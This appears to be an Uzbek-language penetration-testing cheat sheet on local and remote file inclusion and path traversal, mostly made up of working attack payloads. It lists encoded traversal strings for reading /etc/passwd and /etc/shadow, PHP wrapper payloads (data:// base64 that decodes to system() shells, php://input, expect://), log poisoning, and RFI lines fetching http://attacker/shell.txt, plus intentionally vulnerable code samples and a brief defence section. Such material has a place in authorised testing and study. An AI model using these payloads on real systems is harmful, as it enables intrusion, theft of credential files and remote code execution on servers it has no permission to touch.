# LFI / RFI / Path Traversal

## 1. Ta'rif
Path Traversal — file yo'lining input qismi filtrlanmasdan filesystem'ga uzatiladi.
LFI — server file'ni o'qish (`../../etc/passwd`), agar fayl PHP sifatida executor bo'lsa → **RCE**.
RFI — `http://attacker/shell.txt` kabi uzatish orqali PHP kodni yuklash.

## 2. Qayerdan kelib chiqadi
- `include($_GET['page']);` / `require` PHP; `file_get_contents`, `open()`, `read()` boshqa tillarda
- File download endpoint: `download=files/user.pdf`
- `theme=`, `template=`, `lang=`, `file=`, `path=`, `doc=`, `page=`, `filename=`
- Zip/extract, unzipping path'ni tekshirmaslik (zip-slip)

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| Path traversal | `../../etc/passwd` o'qish |
| LFI | server faylini o'qish, PHP chiqishiga intrapretatsiya |
| RFI | uzatilgan URL'dan kod yuklash |
| Zip-slip | zip ichidagi fayl nomi bilan yozish |
| PHP wrappers | `php://filter`, `data://`, `expect://` → RCE |

## 4. Metodologiya
1. Parametrlar: `page?file?dir?path?template?page=` — brute force `ffuf` (payload wordlist).
2. Sinov:
   - `../../../../etc/passwd`
   - `%2e%2e%2f` `..%2f` `..%5c` `....//` `..;/`
   - Null byte qadimgi PHP: `../../etc/passwd%00`
3. Yakuniy prefix qo'shilsa (`/var/www/html/` + `$page`): `....//` yoki `file=../../etc/passwd` ni `./` bilan o'tkazish.
4. Extension qo'shilsa (`.php`): `php://filter` + base64, `data://`, null byte, `.` trick, `?` params.
5. Lekin PHP qatorida wrapper → code cheklash.
6. Log poisoning / session / /proc/self/environ → RCE.
7. RFI: allow_url_fopen=on bo'lsa `?page=http://attacker/shell.txt`.
8. PHP wrapper RCE:
   - `php://filter/convert.base64-encode/resource=config.php` (code o'qish)
   - `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+`
   - `expect://id`
   - `php://input` POST body kod

## 5. Payload'lar
```
/etc/passwd
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
%252e%252e%252f%252e%252e%252fetc/passwd
..%c0%af..%c0%afetc/passwd   (nginx/apache encoding bug)
....//....//....//etc/passwd
..;/..;/..;/etc/passwd       (php filter bypass)
..\..\..\..\windows\win.ini (windows)
C:\Windows\System32\drivers\etc\hosts

# Extension qo'shilsa
../../etc/passwd%00
page=php://filter/convert.base64-encode/resource=index
page=php://filter/read=convert.base64-encode/resource=index.php
page=php://input
page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
page=expect://id
page=/proc/self/environ
page=/var/log/apache2/access.log
page=php://filter/resource=/etc/passwd
```

## 6. Request misollari
```
GET /index.php?page=../../../../etc/passwd HTTP/1.1
Host: target.com

GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1

# data:// RCE
GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg== HTTP/1.1
# keyin: ?page=...&c=id

# php://filter — kod o'qish (base64 chiqadi)
GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1

# php://input post
POST /index.php?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['c']); ?>
```

## 7. Zaif code misollari
```php
// ZAIF
$page = $_GET['page'];
include($page . ".php");

// Zaif foydalanmasi
$x = $_GET['f'];
readfile("/var/www/docs/" . $x);

// Python — ZAIF
with open("/srv/files/" + name, "rb") as f: data = f.read()

// Python — XAVFSIZ
filepath = os.path.realpath("/srv/files/" + name)
if not filepath.startswith("/srv/files/"):
    raise PermissionError
```

## 8. Nimalarga ahamiyat berish (checklist)
- [ ] File nomi sanitizatsiya: `..`/`/` bloklansa `%2e%2e%2f%2e%2e%2f`, double-url, `..;/`
- [ ] Extension: `.php` qo'shilsa — `php://filter`/`data://` hali ham ishlaydi
- [ ] File `echo`/`print` qilinadimi yoki shunchaki o'qiladi (include vs read)
- [ ] `/var/log`, `/proc/self/environ` (User-Agent o'chiqadi), session file, `/tmp`
- [ ] Log poisoning yo'li: UA-ga PHP, log'ni include qilish
- [ ] LFI bor bo'lsa — filter orqali config/.env/password file o'qing
- [ ] Windows: `..\..\`, `root=\`, UNC `\\attacker\x`
- [ ] Zip-slip: upload qilingan zip ichida `../../shell.php`

## 9. Himoya
- Whitelist yoki fayl nomini DB'dan olish (input'dan foydalanmaslik)
- Realpath + prefix tekshirish
- `allow_url_include=Off`, `open_basedir` (PHP)
- Include orqali != read orqali; dynamic include shart emas